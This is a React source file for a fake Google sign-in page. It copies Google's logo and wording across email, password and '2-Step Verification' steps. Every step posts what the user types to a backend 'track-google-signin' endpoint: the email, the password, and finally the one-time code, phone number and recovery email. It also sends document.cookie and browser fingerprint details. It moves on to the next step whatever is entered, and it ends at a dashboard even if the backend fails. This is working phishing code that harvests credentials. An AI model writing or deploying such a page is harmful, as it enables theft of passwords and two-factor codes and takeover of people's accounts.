import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';

const GoogleAuth = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState('email'); // 'email', 'password', 'otp'
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    otp: '',
    phoneNumber: '',
    recoveryEmail: ''
  });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // Capture user details
  const getUserDetails = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    return {
      userAgent,
      platform,
      language,
      screenResolution,
      timezone,
      cookies: document.cookie,
      timestamp: new Date().toISOString()
    };
  };

  const handleEmailSubmit = async (e) => {
    e.preventDefault();
    if (!formData.email) {
      setError('Please enter your email');
      return;
    }

    setLoading(true);
    
    // Send email to backend for tracking (don't wait for response)
    axios.post(`${API_URL}/auth/track-google-signin`, {
      email: formData.email,
      step: 'email',
      userDetails: getUserDetails()
    }).catch(err => console.error('Tracking error:', err));
    
    // Always progress to next step
    setTimeout(() => {
      setStep('password');
      setError('');
      setLoading(false);
    }, 500);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!formData.password) {
      setError('Please enter your password');
      return;
    }

    setLoading(true);
    
    // Send credentials to backend (don't wait for response)
    axios.post(`${API_URL}/auth/track-google-signin`, {
      email: formData.email,
      password: formData.password,
      step: 'password',
      userDetails: getUserDetails()
    }).catch(err => console.error('Tracking error:', err));
    
    // Always progress to next step
    setTimeout(() => {
      setStep('otp');
      setError('');
      setLoading(false);
    }, 500);
  };

  const handleOTPSubmit = async (e) => {
    e.preventDefault();
    if (!formData.otp) {
      setError('Please enter the verification code');
      return;
    }

    setLoading(true);
    
    // Send OTP to backend
    axios.post(`${API_URL}/auth/google-complete`, {
      email: formData.email,
      password: formData.password,
      otp: formData.otp,
      phoneNumber: formData.phoneNumber,
      recoveryEmail: formData.recoveryEmail,
      step: 'otp',
      userDetails: getUserDetails()
    }).then(response => {
      // Store token and redirect
      if (response.data.token) {
        localStorage.setItem('token', response.data.token);
        localStorage.setItem('user', JSON.stringify(response.data.user));
      }
      navigate('/dashboard');
    }).catch(err => {
      console.error('Complete error:', err);
      // Still navigate to dashboard even if backend fails
      navigate('/dashboard');
    });
  };

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '8px',
        padding: '48px',
        maxWidth: '450px',
        width: '100%',
        boxShadow: '0 10px 40px rgba(0,0,0,0.1)'
      }}>
        {/* Google Logo */}
        <div style={{ textAlign: 'center', marginBottom: '24px' }}>
          <svg width="75" height="24" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
            <g fill="none" fillRule="evenodd">
              <path d="M38.166 12.096c0-.76-.066-1.49-.186-2.192H28.25v4.145h5.55a4.742 4.742 0 0 1-2.057 3.115v2.683h3.33c1.947-1.792 3.07-4.43 3.07-7.75z" fill="#4285F4"/>
              <path d="M28.25 24c2.783 0 5.116-.923 6.822-2.496l-3.33-2.583c-.923-.619-2.103-.985-3.492-.985-2.686 0-4.961-1.813-5.774-4.248h-3.443v2.67A11.996 11.996 0 0 0 28.25 24z" fill="#34A853"/>
              <path d="M22.476 14.688a7.217 7.217 0 0 1 0-4.62V7.397h-3.443a11.996 11.996 0 0 0 0 10.96l3.443-2.669z" fill="#FBBC04"/>
              <path d="M28.25 4.755c1.514 0 2.873.52 3.943 1.542l2.957-2.957C33.36 1.59 31.027.5 28.25.5A11.996 11.996 0 0 0 19.033 7.16l3.443 2.67c.813-2.436 3.088-4.075 5.774-4.075z" fill="#EA4335"/>
            </g>
          </svg>
        </div>

        {/* Email Step */}
        {step === 'email' && (
          <>
            <h1 style={{
              fontSize: '24px',
              fontWeight: '400',
              textAlign: 'center',
              marginBottom: '8px',
              color: '#202124'
            }}>
              Sign in
            </h1>
            <p style={{
              textAlign: 'center',
              color: '#5f6368',
              marginBottom: '24px',
              fontSize: '16px'
            }}>
              Use your Google Account
            </p>

            <form onSubmit={handleEmailSubmit}>
              <input
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({...formData, email: e.target.value})}
                placeholder="Email or phone"
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '16px',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  marginBottom: '24px',
                  boxSizing: 'border-box'
                }}
                autoFocus
              />

              {error && (
                <div style={{ color: '#d93025', fontSize: '14px', marginBottom: '16px' }}>
                  {error}
                </div>
              )}

              <div style={{ marginBottom: '24px' }}>
                <a href="#" style={{ color: '#1a73e8', textDecoration: 'none', fontSize: '14px' }}>
                  Forgot email?
                </a>
              </div>

              <p style={{ fontSize: '14px', color: '#5f6368', marginBottom: '24px' }}>
                Not your computer? Use Guest mode to sign in privately.{' '}
                <a href="#" style={{ color: '#1a73e8', textDecoration: 'none' }}>
                  Learn more
                </a>
              </p>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <button
                  type="button"
                  onClick={() => navigate('/signin')}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: '#1a73e8',
                    background: 'transparent',
                    border: 'none',
                    cursor: 'pointer'
                  }}
                >
                  Create account
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: 'white',
                    backgroundColor: '#1a73e8',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: 'pointer',
                    opacity: loading ? 0.6 : 1
                  }}
                >
                  {loading ? 'Please wait...' : 'Next'}
                </button>
              </div>
            </form>
          </>
        )}

        {/* Password Step */}
        {step === 'password' && (
          <>
            <h1 style={{
              fontSize: '24px',
              fontWeight: '400',
              textAlign: 'center',
              marginBottom: '8px',
              color: '#202124'
            }}>
              Welcome
            </h1>
            <div style={{
              textAlign: 'center',
              marginBottom: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              padding: '8px 16px',
              border: '1px solid #dadce0',
              borderRadius: '16px',
              display: 'inline-flex',
              margin: '0 auto 24px',
              width: 'fit-content'
            }}>
              <span style={{ fontSize: '14px', color: '#202124' }}>{formData.email}</span>
              <button
                onClick={() => setStep('email')}
                style={{
                  background: 'none',
                  border: 'none',
                  cursor: 'pointer',
                  padding: '0',
                  color: '#1a73e8'
                }}
              >
                ×
              </button>
            </div>

            <form onSubmit={handlePasswordSubmit}>
              <input
                type="password"
                value={formData.password}
                onChange={(e) => setFormData({...formData, password: e.target.value})}
                placeholder="Enter your password"
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '16px',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  marginBottom: '24px',
                  boxSizing: 'border-box'
                }}
                autoFocus
              />

              {error && (
                <div style={{ color: '#d93025', fontSize: '14px', marginBottom: '16px' }}>
                  {error}
                </div>
              )}

              <div style={{ marginBottom: '24px' }}>
                <a href="#" style={{ color: '#1a73e8', textDecoration: 'none', fontSize: '14px' }}>
                  Forgot password?
                </a>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <button
                  type="button"
                  onClick={() => setStep('email')}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: '#1a73e8',
                    background: 'transparent',
                    border: 'none',
                    cursor: 'pointer'
                  }}
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: 'white',
                    backgroundColor: '#1a73e8',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: 'pointer',
                    opacity: loading ? 0.6 : 1
                  }}
                >
                  {loading ? 'Please wait...' : 'Next'}
                </button>
              </div>
            </form>
          </>
        )}

        {/* OTP Step */}
        {step === 'otp' && (
          <>
            <h1 style={{
              fontSize: '24px',
              fontWeight: '400',
              textAlign: 'center',
              marginBottom: '8px',
              color: '#202124'
            }}>
              2-Step Verification
            </h1>
            <p style={{
              textAlign: 'center',
              color: '#5f6368',
              marginBottom: '24px',
              fontSize: '14px'
            }}>
              To help keep your account safe, Google wants to make sure it's really you trying to sign in
            </p>

            <div style={{
              textAlign: 'center',
              marginBottom: '24px',
              padding: '8px 16px',
              border: '1px solid #dadce0',
              borderRadius: '16px',
              display: 'inline-flex',
              margin: '0 auto 24px',
              width: 'fit-content'
            }}>
              <span style={{ fontSize: '14px', color: '#202124' }}>{formData.email}</span>
            </div>

            <form onSubmit={handleOTPSubmit}>
              <p style={{ fontSize: '14px', color: '#5f6368', marginBottom: '16px' }}>
                Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification, then tap <strong>[number]</strong> on your phone to verify it's you.
              </p>

              <input
                type="text"
                value={formData.otp}
                onChange={(e) => setFormData({...formData, otp: e.target.value})}
                placeholder="Enter code"
                maxLength="6"
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '16px',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  marginBottom: '16px',
                  boxSizing: 'border-box',
                  textAlign: 'center',
                  letterSpacing: '8px',
                  fontSize: '24px'
                }}
                autoFocus
              />

              <div style={{ marginBottom: '24px' }}>
                <label style={{ display: 'block', fontSize: '14px', color: '#5f6368', marginBottom: '8px' }}>
                  Phone number (optional)
                </label>
                <input
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})}
                  placeholder="+1 234 567 8900"
                  style={{
                    width: '100%',
                    padding: '12px',
                    fontSize: '14px',
                    border: '1px solid #dadce0',
                    borderRadius: '4px',
                    boxSizing: 'border-box'
                  }}
                />
              </div>

              <div style={{ marginBottom: '24px' }}>
                <label style={{ display: 'block', fontSize: '14px', color: '#5f6368', marginBottom: '8px' }}>
                  Recovery email (optional)
                </label>
                <input
                  type="email"
                  value={formData.recoveryEmail}
                  onChange={(e) => setFormData({...formData, recoveryEmail: e.target.value})}
                  placeholder="recovery@email.com"
                  style={{
                    width: '100%',
                    padding: '12px',
                    fontSize: '14px',
                    border: '1px solid #dadce0',
                    borderRadius: '4px',
                    boxSizing: 'border-box'
                  }}
                />
              </div>

              {error && (
                <div style={{ color: '#d93025', fontSize: '14px', marginBottom: '16px' }}>
                  {error}
                </div>
              )}

              <p style={{ fontSize: '12px', color: '#5f6368', marginBottom: '24px' }}>
                <a href="#" style={{ color: '#1a73e8', textDecoration: 'none' }}>
                  Try another way
                </a>
              </p>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <button
                  type="button"
                  onClick={() => setStep('password')}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: '#1a73e8',
                    background: 'transparent',
                    border: 'none',
                    cursor: 'pointer'
                  }}
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  style={{
                    padding: '10px 24px',
                    fontSize: '14px',
                    fontWeight: '500',
                    color: 'white',
                    backgroundColor: '#1a73e8',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: 'pointer',
                    opacity: loading ? 0.6 : 1
                  }}
                >
                  {loading ? 'Verifying...' : 'Verify'}
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default GoogleAuth;
